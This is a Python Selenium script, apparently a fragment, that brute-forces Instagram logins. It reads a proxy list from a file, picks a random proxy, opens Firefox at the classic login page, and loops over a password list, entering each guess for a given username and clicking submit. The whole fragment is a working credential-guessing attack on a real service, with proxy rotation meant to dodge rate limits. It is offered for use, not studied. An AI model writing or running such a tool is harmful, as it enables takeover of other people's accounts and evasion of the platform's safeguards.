


url='https://www.instagram.com/accounts/login/?force_classic_login'
proxies = open("proxies.txt","r")
proxy_list =[]
for _ in proxies:
    proxy_list.append(_)
#"https://instagram.com")

def login(username:str,password:list):
    firefox_profile = webdriver.FirefoxProfile()
    print("starting firefox")
    firefox_profile.set_preference("browser.privatebrowsing.autostart", True)
    browser = webdriver.Firefox()
    print("hehboi")
    browser.delete_all_cookies()
    print("[+] deleted all cookies")
    prox = random.choice(proxy_list)
    print(f"[+]using proxy:{prox}\n")
    webdriver.DesiredCapabilities.FIREFOX['proxy']={
            "httpProxy":prox,
            #"ftpProxy":prox,
            "sslProxy":prox,
            "noProxy":None,
            "proxyType":"manual"
        }    
    browser.get(url)
    time.sleep(2)
    print(f"no of passwords:{len(password)}")
    for pw in password:
        attempt =1
        print(f"\n[+]attempt:{attempt} \ntrying:{pw}")
        browser.find_element_by_xpath("//*[@id=\"id_username\"]").clear()
        browser.find_element_by_xpath("//*[@id=\"id_username\"]").send_keys(username)
        browser.find_element_by_xpath("/html/body/div/section/div/div/form/p[2]/input").clear()
        browser.find_element_by_xpath("/html/body/div/section/div/div/form/p[2]/input").send_keys(pw)
        try:
            browser.find_element_by_xpath("/html/body/div/section/div/div/form/p[3]/input").click()
            attempt+=1
            #return 0
            #time.sleep(5)
        except Exception as e:
            print(e)
            #return 1